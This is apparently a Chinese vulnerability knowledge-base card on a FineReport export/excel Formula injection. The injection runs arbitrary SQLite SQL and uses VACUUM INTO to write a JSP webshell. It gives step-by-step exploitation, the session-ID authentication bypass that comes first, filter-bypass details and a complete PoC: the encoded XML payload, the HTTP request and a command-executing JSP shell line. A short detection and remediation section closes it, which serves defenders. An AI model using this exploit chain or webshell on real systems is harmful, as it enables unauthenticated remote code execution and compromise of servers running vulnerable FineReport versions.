---
id: web-java-component-finereport-export-excel-formula-sqli-vacuum-webshell
title: FineReport export/excel 的 params XML Formula 注入：Calculator.evalValue 执行 sql()，借 SQLite VACUUM INTO 写 JSP WebShell
type: scenario
domain: web
path: web/java/component
technique: finereport-export-excel-formula-sqli-vacuum-webshell
aliases:
- 帆软 export/excel SQL 注入
- FineReport largedataset export excel RCE
- LargeDatasetExcelExportHandler Formula 注入
- Calculator.evalValue sql()
- SQLite VACUUM INTO 写 JSP
- FineReport 11.5.4 webshell
tags:
- java
- finereport
- sqli
- formula-injection
- sqlite
- vacuum-into
- arbitrary-file-write
- webshell
- rce
- waf-bypass
cve: []
severity: critical
confidence: high
status: verified
affected_versions: FineReport < 11.5.4.1；FineBi 7.0.* < 7.0.5；FineBi 6.1.* < 6.1.8；FineBi 6.0.* < 6.0.24；FineDataLink 5.0.* < 5.0.4.3；FineDataLink 4.0.* < 4.2.11.3（原文标记）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V53
  verified_at: '2026-11-05T09:32:30+08:00'
  notes: 已对照原文及39张图核对：图21-33确认export/excel路由、doHandle/initCreator/getEntity(params XML)/Parameters/Object t=Formula/BaseFormula.readXML/getFormula、dealParam的Calculator.evalValue执行sql('FRDemo',DECODE(...))且无回显；图34-36确认removeSpecialCharacters特殊字符替换与xp_dirtree/insert/merge/attach四关键词、11.5.5 SQLiteInsecurityElementProvider新增vacuum/pragma/replace/detach；图37确认整库导出致Jasper编译错误；图38-39确认删schema+VACUUM INTO写JSP后/webroot/waibiwaibi.jsp?cmd=calc弹计算器。未验证点：原文未给FRDemo数据源前置条件之外的部署细节；PoC需按目标webapps/webroot相对路径调整；未本机复跑。小问题：1) 原文称11.5.5新增vacuum/pragma/replace/detach四项，卡内'补上了这五项'建议核对；2) 一句话结论称'伪造的sessionID'，实为经鉴权绕过获取的合法sessionID，建议改为'通过鉴权绕过获取的sessionID'；3) 特殊字符列表原文含\r，卡内未列。核心链与端到端证据成立。
---

## 一句话结论

FineReport 的 `/webroot/decision/nx/report/v9/largedataset/export/excel` 把请求参数 `params` 当 XML 解析，其中 `Parameter` 的 `<Object t="Formula">` 内容会经 `Calculator.evalValue()` 求值；攻击者用伪造的 sessionID 调用该接口，在 Formula 中执行 `sql('FRDemo', DECODE(...), 1, 1)` 即可对默认 SQLite 库执行任意 SQL，再利用 `VACUUM INTO '../webapps/webroot/xxx.jsp'` 把数据库内容导出为 JSP WebShell，未认证获得命令执行（FineReport < 11.5.4.1）。

## 原理

- **入口**：`export/excel` 路由常量对应 `/report/v9/largedataset/export/excel`（v10 同常量），由 `LargeDatasetExcelExportHandler#doHandle` 处理。它先用 `SessionPoolManager.getSessionIDInfor(sessionID)` 取模板信息并 `getCalculatorFromPara()` 初始化一个 `Calculator`（帆软表达式计算工具），再进入 `initCreator()`。
- **params XML 进入 Formula**：`initCreator()` 调用 `getEntity(request)`：
  ```java
  String params = WebUtils.getHTTPRequestParameter(request, "params");
  LargeDatasetExcelExportJavaScript entity = new LargeDatasetExcelExportJavaScript();
  XMLableReader reader = XMLableReader.createXMLableReader(params);
  reader.readXMLObject(entity);
  ```
  `LargeDatasetExcelExportJavaScript#readXML` 解析 `LargeDatasetExcelExportJS` 标签；其父类 `readXML` 遇到 `Parameters` 时调用 `BaseXMLUtils.readParameters()`，再对每个 `Parameter` 调 `readXML`，遇到 `<Object t="...">` 时走 `GeneralXMLTools.readObject()` → `Object_Tokenizer.tokenizerObject()`。
- **Formula 类型**：当 `t="Formula"` 时进入 `BaseObjectTokenizer#getFormula()`，实例化 `com.fr.base.Formula` 并 `readXMLObject()`；`BaseFormula#readXML` 读取子标签 `Attributes` 的文本作为 `Content`。因此 `params` 里的：
  ```xml
  <Object t="Formula"><Attributes>sql('FRDemo', DECODE('...'),1,1)</Attributes></Object>
  ```
  就是一段可控的帆软表达式。
- **表达式求值点**：`dealParam()` 遍历 `Parameter`，当 `functionParams`（JSON，原文传 `{}`）中没有同名值时，若 `parameter.getValue() instanceof Formula` 就执行 `Calculator.evalValue(String.valueOf(value))`。`sql()` 是帆软内置表达式函数，参数为数据源名、SQL、列/行索引；`FRDemo` 为自带 SQLite 测试库。
- **编码**：`DECODE()` 做 URL 解码，请求参数本身还会经过一次解码，因此 SQL 需要双重 URL 编码才能还原；原文用 `DECODE('%2573%2565...')` 最终得到 `select 'waibiwaibi'`，确认 SQL 执行（该接口不回显查询结果，只能盲打）。
- **写文件原语（SQLite VACUUM INTO）**：`VACUUM INTO '<path>'` 会把当前数据库导出到指定文件，文件内容即 SQLite 数据库二进制。把 JSP 代码作为表中文本写入，再 VACUUM 导出到 `../webapps/webroot/waibiwaibi.jsp`，即可得到含 JSP 代码的数据库文件。11.5.4 的 SQL 检查 `removeSpecialCharacters()` 会把逗号、换行、分号、制表符、`\f`、`\v`、U+FEFF 替换为空格，剥离引号/注释内容后按 `xp_dirtree`、`insert`、`merge`、`attach` 四个关键词匹配；因此旧版的 `ATTACH DATABASE`/U+FEFF 技巧被拦，但 `VACUUM`、`PRAGMA`、`REPLACE`、`DETACH` 在 11.5.4 尚未加入黑名单（11.5.5 的 `SQLiteInsecurityElementProvider` 补上了这五项）。
- **整库导出的问题与删库技巧**：直接 `CREATE TABLE shell_data1; REPLACE INTO ...; VACUUM INTO ...jsp` 会把整个数据库导出，二进制中大量特殊字符导致 JSP 编译失败（原文日志报 `未终止的[&lt;%--]标记`）。因此先 `VACUUM INTO './frdemo.db.bak'` 备份，再 `PRAGMA writable_schema=1` + `delete from sqlite_schema` 清空 schema，`CREATE TABLE t1` 写入 JSP 文本，`COMMIT` 后 `VACUUM INTO '../webapps/webroot/waibiwaibi.jsp'`，导出的数据库只含少量结构 + JSP 文本，可被 Jasper 编译。
- **认证**：导出接口通过 sessionID 判断模板鉴权；先用 `/webroot/decision/view/report?op=getSessionID&reportlets=[{'reportlet':'/'}]` 未认证取得 sessionID（见关联卡），即可以合法会话调用导出接口。
- 原文实测：请求返回 JSON `{"errorCode":"400","errorMsg":"[LARGE-DATA-EXPORTER]tableData is null"}`，但 SQL 已执行，`/webroot/waibiwaibi.jsp?cmd=calc` 成功弹出计算器——业务报错不能作为是否执行 SQL 的判断依据。

## 触发条件

- FineReport < 11.5.4.1（以及原文列出的 FineBi 7.0.* < 7.0.5、FineBi 6.1.* < 6.1.8、FineBi 6.0.* < 6.0.24、FineDataLink 5.0.* < 5.0.4.3、4.0.* < 4.2.11.3）。
- 目标存在默认 `FRDemo` SQLite 连接或任意可执行 `VACUUM INTO`/堆叠语句的 SQLite 数据源。
- 攻击者能取得合法模板 sessionID（可用鉴权绕过卡中的 `op=getSessionID` 链，无需登录）。
- Web 进程对 `webapps/webroot` 可写，Tomcat/Jasper 能解析 `.jsp`；Windows 下需先访问 `/webroot/decision/file?path=org.apache.jasper.servlet.JasperInitializer&type=class` 开启 JSP 解析。
- `params` 可放在 query、header、body、cookie 等位置（`getHTTPRequestParameter` 会从多处取）。

## 利用步骤

1. 先获取 sessionID：`GET /webroot/decision/view/report?op=getSessionID&reportlets=[{'reportlet':'/'}]`，取响应 UUID。
2. 验证 Formula 求值：构造 `params` XML，`<Object t="Formula">` 内放 `sql('FRDemo', DECODE('<双重编码的 select ...>'),1,1)`，带 `sessionID` 头请求导出接口；通过响应时间/错误特征判断 SQL 是否执行（无回显）。
3. 备份并清空 SQLite schema（减少导出文件中的二进制垃圾）：
   - `VACUUM INTO './frdemo.db.bak'`
   - `PRAGMA writable_schema=1;`
   - `delete from sqlite_schema`
4. 建表并写入 JSP：`CREATE TABLE t1(p text); REPLACE INTO t1 VALUES ('<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'); COMMIT;`
5. 导出到 Web 根：`VACUUM INTO '../webapps/webroot/waibiwaibi.jsp'`。
6. Windows 先访问 `/webroot/decision/file?path=org.apache.jasper.servlet.JasperInitializer&type=class` 初始化 Jasper；然后访问 `/webroot/waibiwaibi.jsp?cmd=whoami` 验证命令执行。
7. 若一次 Formula 放不下，可用 `-sql(...)-sql(...)` 在同一 `<Attributes>` 中串联多个语句；每个 Parameter 也可各放一条 SQL。

## PoC

```xml
<R>
    <Parameters a="1">
        <Parameter>
            <Attributes name="p0"></Attributes>
            <Object t="Formula">
                <Attributes>sql('FRDemo',DECODE('VACUUM+INTO+%27.%2Ffrdemo.db.bak%27%3B'),1,1)</Attributes>
            </Object>
        </Parameter>
        <Parameter>
            <Attributes name="p1"></Attributes>
            <Object t="Formula">
                <Attributes>sql('FRDemo',DECODE('PRAGMA+writable_schema%3D1%3B'),1,1)-sql('FRDemo',"delete from sqlite_schema",1,1)</Attributes>
            </Object>
        </Parameter>
        <Parameter>
            <Attributes name="p2"></Attributes>
            <Object t="Formula">
                <Attributes>sql('FRDemo',DECODE('CREATE+TABLE+t1+%28p+text%29%3B%29'),1,1)-sql('FRDemo',DECODE('REPLACE+INTO+t1+VALUES+%28%27%3C%25+Runtime.getRuntime%28%29.exec%28request.getParameter%28%22cmd%22%29%29%3B+%25%3E%27%29%3B%29'),1,1)-sql('FRDemo',"COMMIT",1)-sql('FRDemo',DECODE('VACUUM+INTO+%27..%2Fwebapps%2Fwebroot%2Fwaibiwaibi.jsp%27%3B'),1,1)</Attributes>
            </Object>
        </Parameter>
    </Parameters>
    <LargeDatasetExcelExportJS exportFileName="waibiwaibi" dsName="ds1" colNames="{}" exportFormat="excel" encodeFormat="UTF-8"/>
</R>
```

实际发送时 `params` 需整体 URL 编码（原文 Burp 中使用 `{{urlesc(...)}}`），并附带：

```http
GET /webroot/decision/nx/report/v9/largedataset/export/excel HTTP/1.1
Host: target:8075
sessionID: <通过 getSessionID 绕过获得的 UUID>
params: <URL 编码后的上述 XML>
__parameters__: {}
functionParams: {}
Content-Type: application/x-www-form-urlencoded
```

```text
# Windows 初始化 Jasper：
GET /webroot/decision/file?path=org.apache.jasper.servlet.JasperInitializer&type=class

# 访问：
GET /webroot/waibiwaibi.jsp?cmd=calc
# 原文结果：目标主机弹出计算器，确认 WebShell 执行
```

## 变体与关联

- 变体：直接 `CREATE TABLE shell_data1(payload text); REPLACE INTO shell_data1 VALUES ('<JSP>'); VACUUM INTO '...jsp'` 也能写入，但整库二进制易导致 JSP 编译失败；删库/清 schema 技巧可显著缩小导出文件并规避特殊字符。
- 变体：11.5.5 已将 `vacuum`、`pragma`、`replace`、`detach` 加入 SQLite 不安全元素，本文链在 11.5.4 可用、11.5.5 起失效；其他数据库可寻找对应的导出/写文件语法。
- 关联：`[[web-java-component-finereport-getSessionID-auth-bypass]]`（本链的未认证会话来源）；`[[web-java-component-finereport-view-reportserver-template-sqli-webshell]]` 与 `[[web-java-component-finereport-print-ie-pdf-sqli-webshell]]`（同产品旧入口的 `${sql()}` + ATTACH/U+FEFF 写 Shell，本文是新版本过滤下的 VACUUM 变体）。
- 边界：无 SQL 回显，需盲打并依赖文件落盘副作用；`VACUUM INTO` 目标路径与 `webapps/webroot` 相对位置要按部署结构调整；数据库被删 schema 后业务可能异常，原文也提示删库有风险。

## 检测与防御

- 检测：`/nx/report/v9|v10/largedataset/export/excel` 请求的 `params` 含 `Formula`、`sql(`、`DECODE(`、`VACUUM`、`PRAGMA`、`REPLACE INTO`、`sqlite_schema` 等特征；返回 `[LARGE-DATA-EXPORTER]` 错误但 SQL 已执行；`webapps/webroot` 新增 `.jsp`；`frdemo.db.bak` 等异常数据库文件。
- 修复：升级到 FineReport 11.5.4.1+、FineBi 7.0.5+/6.1.8+/6.0.24+、FineDataLink 5.0.4.3+/4.2.11.3+；服务端禁止不可信 XML 中的 `Formula`/类实例化，参数解析使用白名单字段。
- 加固：SQL 安全模块把 `VACUUM`、`PRAGMA`、`REPLACE`、`DETACH` 等全部纳入黑名单，并先剥离不可见字符；禁用默认 `FRDemo` 测试库或设为只读；Web 根目录禁止写入/执行脚本；校验 sessionID 时同时校验登录态。
- 检测：`/webroot/decision/view/report?op=getSessionID` 的异常调用与导出接口请求关联分析；Jasper 初始化器被主动访问；WebShell 访问日志中的 `cmd=` 参数。
